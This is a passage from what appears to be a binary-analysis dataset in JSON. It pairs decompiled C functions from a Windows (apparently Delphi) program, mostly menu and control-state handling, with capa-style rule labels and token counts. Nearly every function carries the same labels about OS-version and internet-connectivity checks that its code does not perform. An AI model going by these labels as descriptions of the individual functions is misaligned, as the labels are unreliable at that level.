= *(uVar4 * 2 + 0x4934e0) | 0x560;\n    fcn.00434a80(uVar4, 0, &var_20h);\n    *var_4h = *var_4h + (var_18h - var_20h) + 7;\n    if (*(in_EAX + 0xa2) != 0) {\n        (**(in_EAX + 0xa0))(arg_8h, var_4h);\n    }\n    *in_FS_OFFSET = uVar4;\n    fcn.00405530(0x436375);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 938
    },
    "004363c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004363c8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((*(in_EAX + 100) != 0) && (iVar1 = fcn.0043653c(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0043654c();\n            if ((in_EAX != iVar2) && ((*(iVar2 + 0x3d) != '\\0' && (*(iVar2 + 0x3f) == *(in_EAX + 0x3f))))) {\n                fcn.00436414();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00436414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436414(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (param_2 != *(in_EAX + 0x38)) {\n        *(in_EAX + 0x38) = param_2;\n        if ((*(in_EAX + 100) != 0) && ((*(in_EAX + 0x1c) & 2) == 0)) {\n            uVar1 = fcn.004349f0(*(in_EAX + 0x50), *(param_2 * 4 + 0x493468));\n            sub.user32.dll_CheckMenuItem(uVar1);\n        }\n        if ((param_2 != 0) && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.004363c8();\n        }\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00436468": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436468(uint param_1, uint8_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (param_2 == *(in_EAX + 0x39)) {\n        return;\n    }\n    *(in_EAX + 0x39) = param_2;\n    if (((**0x495d18 != 2) || (iVar1 = fcn.0043653c(),  iVar1 == 0)) &&\n       ((in_EAX[0x19] == 0 || (*(in_EAX[0x19] + 0x6c) == 0)))) {\n        if ((in_EAX[0x19] != 0) && ((*(in_EAX + 7) & 2) == 0)) {\n            uVar2 = fcn.004349f0(*(in_EAX + 0x14), *(param_2 * 4 + 0x493470));\n            sub.user32.dll_EnableMenuItem(uVar2);\n        }\n        (**(*in_EAX + 0x3c))();\n        return;\n    }\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 274
    },
    "004364e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004364e0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != *(in_EAX + 0x3f)) {\n        if (*(in_EAX + 100) != 0) {\n            fcn.004368a4();\n            fcn.00434990();\n        }\n        *(in_EAX + 0x3f) = param_2;\n        if ((*(in_EAX + 0x38) != '\\0') && (*(in_EAX + 0x3d) != '\\0')) {\n            fcn.004363c8();\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0043654c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043654c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x5c) == 0) {\n        fcn.00433a30();\n    }\n    fcn.004198b4();\n    return;\n}\n",
        "token_count": 63
    },
    "004366c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004366c8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*(param_1 + 100) != 0) {\n        fcn.00433a30();\n    }\n    if (in_EAX[0x17] == 0) {\n        iVar1 = fcn.00404620();\n        in_EAX[0x17] = iVar1;\n    }\n    if ((-1 < param_2 + -1) && (param_2 + -1 < *(in_EAX[0x17] + 8))) {\n        iVar1 = fcn.004198b4();\n        if (*(param_1 + 0x3f) <= *(iVar1 + 0x3f) && *(iVar1 + 0x3f) != *(param_1 + 0x3f)) {\n            fcn.004198b4();\n            fcn.004364e0();\n        }\n    }\n    fcn.00434990();\n    fcn.00419930();\n    *(param_1 + 100) = in_EAX;\n    *(param_1 + 0x84) = in_EAX;\n    *(param_1 + 0x80) = fcn.00436944;\n    if (in_EAX[0xd] != 0) {\n        fcn.004348c0();\n    }\n    fcn.0043653c();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 347
    },
    "00436780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436780(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((-1 < param_2) && (in_EAX[0x17] != 0)) {\n        iVar1 = fcn.0043653c();\n        if (param_2 < iVar1) goto code_r0x004367a6;\n    }\n    fcn.00433a30();\ncode_r0x004367a6:\n    iVar1 = fcn.004198b4();\n    fcn.004197a8();\n    *(iVar1 + 100) = 0;\n    *(iVar1 + 0x80) = 0;\n    *(iVar1 + 0x84) = 0;\n    if (in_EAX[0xd] != 0) {\n        fcn.004348c0();\n    }\n    fcn.0043653c();\n    (**(*in_EAX + 0x3c))();\n    return;\n}\n",
        "token_count": 231
    },
    "00436944": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436944(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((arg_8h != '\\0') && ((*(in_EAX + 0x34) != 0 || (*(in_EAX + 0x6c) != 0)))) {\n        fcn.004348c0();\n    }\n    if (*(in_EAX + 100) == 0) {\n        cVar1 = fcn.004047dc();\n        if (cVar1 != '\\0') {\n            fcn.004388c8();\n        }\n    }\n    else {\n        fcn.00436944(0);\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00437610": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00437610(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t uStack24;\n    int32_t iStack20;\n    \n    uStack24 = 0;\n    if ((param_2 != '\\0') || (((*(in_EAX + 0x1c) & 0x10) == 0 && (cVar1 = fcn.00437798(),  cVar1 != '\\0')))) {\n        iStack20 = 0;\n        iVar5 = 0;\n        iVar4 = 0;\n        iVar2 = fcn.0043653c();\n        iVar3 = iStack20;\n        if (-1 < iVar2 + -1) {\n            do {\n                iVar3 = fcn.0043654c();\n                if (*(iVar3 + 0x3e) != '\\0') {\n                    fcn.0043654c();\n                    cVar1 = fcn.004375ec();\n                    iVar3 = iVar4;\n                    if (cVar1 == '\\0') break;\n                    iVar3 = fcn.0043654c();\n                    *(iVar3 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar4 = iVar4 + 1;\n                iVar2 = iVar2 + -1;\n                iVar3 = iStack20;\n            } while (iVar2 != 0);\n        }\n        iStack20 = iVar3;\n        iVar4 = fcn.0043653c();\n        if (iStack20 <= iVar4 + -1) {\n            iVar3 = ((iVar4 + -1) - iStack20) + 1;\n            iVar4 = iStack20;\n            do {\n                fcn.0043654c();\n                cVar1 = fcn.004375ec();\n                if (cVar1 == '\\0') {\n                    iVar2 = fcn.0043654c();\n                    if (*(iVar2 + 0x3e) != '\\0') {\n                        if ((iVar5 != 0) && (*(iVar5 + 0x3e) == '\\0')) {\n                            *(iVar5 + 0x3e) = 1;\n                            uStack24 = 1;\n                        }\n                        iVar5 = 0;\n                        iStack20 = iVar4;\n                    }\n                }\n                else {\n                    if ((iVar5 != 0) && (*(iVar5 + 0x3e) != '\\0')) {\n                        *(iVar5 + 0x3e) = 0;\n                        uStack24 = 1;\n                    }\n                    iVar5 = fcn.0043654c();\n                }\n                iVar4 = iVar4 + 1;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n        iVar4 = fcn.0043653c();\n        iVar3 = iStack20 - (iVar4 + -1);\n        if (iVar3 == 0 || iStack20 < iVar4 + -1) {\n            iVar3 = iVar3 + -1;\n            do {\n                iVar4 = fcn.0043654c();\n                if (*(iVar4 + 0x3e) != '\\0') {\n                    fcn.0043654c();\n                    cVar1 = fcn.004375ec();\n                    if (cVar1 == '\\0') break;\n                    iVar4 = fcn.0043654c();\n                    *(iVar4 + 0x3e) = 0;\n                    uStack24 = 1;\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 != 0);\n        }\n    }\n    return CONCAT44(iStack20, uStack24);\n}\n",
        "token_count": 836
    },
    "00437768": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00437768(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3b);\n    if ((*(in_EAX + 0x3b) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00437768();\n        uVar1 = *((uVar1 & 0x7f) + 0x493418);\n    }\n    return *((uVar1 & 0x7f) + 0x49341c);\n}\n",
        "token_count": 135
    },
    "00437798": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar fcn.00437798(void)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = *(in_EAX + 0x3c);\n    if ((*(in_EAX + 0x3c) == 2) && (*(in_EAX + 100) != 0)) {\n        uVar1 = fcn.00437798();\n        uVar1 = *((uVar1 & 0x7f) + 0x493418);\n    }\n    return *((uVar1 & 0x7f) + 0x49341c);\n}\n",
        "token_count": 135
    },
    "004377c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t * __fastcall fcn.004377c8(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    iVar1 = fcn.004343bc();\n    in_EAX[0xd] = iVar1;\n    *(iVar1 + 0x84) = in_EAX;\n    *(iVar1 + 0x80) = *(*in_EAX + 0x38);\n    *(iVar1 + 0x70) = in_EAX;\n    iVar1 = fcn.00404620();\n    in_EAX[0x11] = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x438308;\n    *(in_EAX + 0x41) = 1;\n    fcn.0041ff70();\n    iVar1 = in_EAX[0xd];\n    *(iVar1 + 0x3b) = 0;\n    *(iVar1 + 0x3c) = 0;\n    fcn.00438778();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 356
    },
    "00437928": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.00437928(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    if ((((*(arg_8h + -1) == '\\0') && (*(arg_8h + -8) == *(in_EAX + 0x50))) ||\n        ((*(arg_8h + -1) == '\\x01' && (*(arg_8h + -8) == *(in_EAX + 0x34))))) ||\n       ((*(arg_8h + -1) == '\\x02' && (*(arg_8h + -8) == *(in_EAX + 0x60))))) {\n        *(arg_8h + -0xc) = in_EAX;\n        var_1h._0_1_ = 1;\n    }\n    else {\n        iVar2 = fcn.0043653c();\n        if (-1 < iVar2 + -1) {\n            do {\n                arg_8h_00 = arg_8h;\n                fcn.0043654c();\n                cVar1 = fcn.00437928(arg_8h_00);\n                if (cVar1 != '\\0') {\n                    return 1;\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 367
    },
    "004379f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004379f0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    char cStack20;\n    \n    uVar3 = 0;\n    cStack20 = param_1;\n    if (((cStack20 == '\\0') && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) &&\n       (iVar2 = (**(*in_EAX + 0x34))(),  param_2 == iVar2)) {\n        uVar3 = fcn.00438f94();\n    }\n    else {\n        for (iVar2 = fcn.004379c0(); (iVar2 != 0 && (*(iVar2 + 0x54) == 0)); iVar2 = *(iVar2 + 100)) {\n        }\n        if (iVar2 != 0) {\n            uVar3 = *(iVar2 + 0x54);\n        }\n    }\n    return CONCAT44(param_1, uVar3);\n}\n",
        "token_count": 240
    },
    "00437b44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437b44(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x40) == '\\0') && (*(in_EAX + 0x48) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 67
    },
    "00437d98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar __cdecl fcn.00437d98(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t **in_EAX;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStackY36;\n    uint uStackY32;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = '\\x01';\n    iVar1 = (*in_EAX)[0x19];\n    if (iVar1 != 0) {\n        uStackY32 = 0x437dc6;\n        var_1h._0_1_ = fcn.00437d98(arg_8h);\n    }\n    if ((var_1h != '\\0') && (var_1h != '\\x03')) {\n        if (var_1h == '\\x02') {\n            if ((*(arg_8h + -4) == 0) || (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6))) {\n                uVar2 = fcn.004379c0();\n                *(arg_8h + -4) = uVar2;\n                if (*(arg_8h + -4) == 0) {\n                    return '\\x03';\n                }\n            }\n            piVar3 = fcn.00437d88();\n            *in_EAX = piVar3;\n            if (*in_EAX == NULL) {\n                return '\\x02';\n            }\n            if ((*in_EAX)[0x19] != iVar1) {\n                return '\\x02';\n            }\n            if (in_EDX == 0) {\n                var_1h._0_1_ = '\\x01';\n            }\n        }\n        if (*(*in_EAX + 0x39) == '\\0') {\n            var_1h._0_1_ = '\\0';\n        }\n        else {\n            uStackY32 = 0x437ebe;\n            uStackY36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            if ((*(*(arg_8h + -0xc) + 0x1c) & 0x10) == 0) {\n                fcn.00436a68();\n            }\n            (**(**in_EAX + 0x44))();\n            if ((*(arg_8h + -4) == 0) || ((*in_EAX != *(arg_8h + -4) && (*(*(arg_8h + -4) + 0x60) != *(arg_8h + -6)))))\n            {\n                var_1h._0_1_ = '\\x02';\n            }\n            *in_FS_OFFSET = uStackY36;\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 654
    },
    "00437eec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00437eec(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_ch;\n    uint var_6h;\n    \n    puStack36 = 0x437f00;\n    cVar1 = fcn.00437cfc();\n    if (cVar1 != '\\0') {\n        return 0;\n    }\n    puStack36 = 0x437f0f;\n    fcn.00437d38();\n    puStack36 = 0x437f29;\n    fcn.0042cd5c();\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack40 = 0x437fbf;\n    puStack48 = 0x437f49;\n    puStack36 = &stack0xfffffffc;\n    iVar2 = fcn.004379c0();\n    if (iVar2 == 0) {\n        *in_FS_OFFSET = uStack44;\n        puStack36 = 0x437fc6;\n        uStack40 = 0x437fbe;\n        uVar3 = fcn.0042cd54();\n        return uVar3;\n    }\n    puStack48 = 0x437f5f;\n    fcn.0042cd5c();\n    uStack52 = 0x437f94;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00437d98(&stack0xfffffffc);\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x437f9b;\n    uStack52 = 0x437f93;\n    uVar3 = fcn.0042cd54();\n    return uVar3;\n}\n",
        "token_count": 454
    },
    "00437fe8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00437fe8(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uStack152;\n    uint uStack148;\n    uint32_t uStack144;\n    uchar *puStack140;\n    uint uStack136;\n    uint uStack132;\n    uchar *puStack100;\n    uint uStack96;\n    uchar auStack88 [80];\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (in_EAX[0xe] != 0)) {\n        puStack140 = 0x43800f;\n        uVar2 = (**(*in_EAX + 0x34))();\n        uStack136 = 0x2c;\n        uStack132 = 0x10;\n        puStack100 = &stack0xffffffa8;\n        uStack96 = 0x50;\n        uStack144 = 0xffffffff;\n        uStack148 = 0;\n        uStack152 = uVar2;\n        puStack140 = &stack0xffffff78;\n        iVar3 = sub.user32.dll_GetMenuItemInfoA();\n        if (iVar3 != 0) {\n            cVar1 = fcn.0043837c();\n            if (cVar1 != '\\x01' - ((uStack144 & 0x6000) == 0)) {\n                uVar4 = fcn.0043837c();\n                uStack144 = (uVar4 & 0x7f) * 0x6000 | uStack144 & 0xffff9fff;\n                uStack148 = 0x10;\n                iVar3 = sub.user32.dll_SetMenuItemInfoA(uVar2, 0, 0xffffffff, &stack0xffffff68);\n                if (iVar3 != 0) {\n                    sub.user32.dll_DrawMenuBar(in_EAX[0xe]);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "00438150": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00438150(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar *arg_8h;\n    uint var_204h;\n    uint var_200h;\n    \n    arg_8h = &stack0xfffffffc;\n    if (in_EAX[0xe] != 0) {\n        (**(*in_EAX + 0x34))();\n        fcn.004380a4(arg_8h);\n    }\n    if (in_EAX[0xf] != 0) {\n        fcn.004059dc();\n        iVar1 = fcn.0040a978();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    fcn.004057a0();\n    return 1;\n}\n",
        "token_count": 174
    },
    "004381e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004381e4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar var_6h;\n    char var_5h;\n    int32_t var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(*0x495d2c + 0xd) != '\\0') {\n        var_5h = *(in_EAX + 0x30);\n        var_6h = *(in_EAX + 0x41);\n        uStack20 = 0x438258;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        var_4h = in_EAX;\n        if (var_5h == '\\0') {\n            puStack16 = &stack0xfffffffc;\n            fcn.00438754();\n        }\n        else {\n            fcn.00438754();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x43825f;\n        uStack20 = 0x43824d;\n        fcn.00438754();\n        *(var_4h + 0x41) = var_6h;\n        return;\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00438264": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438264(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0x38) = param_2;\n    fcn.00438150();\n    if ((*(*0x495d2c + 0xd) != '\\0') && (param_2 != 0)) {\n        if (*(in_EAX + 0x41) == '\\0') {\n            fcn.004381e4();\n        }\n        else {\n            fcn.00438778();\n        }\n    }\n    return;\n}\n",
        "token_count": 132
    },
    "0043837c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043837c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x495d2c + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "00438530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00438530(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.00438394(*(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.004383f0(*(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 935
    },
    "004386ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
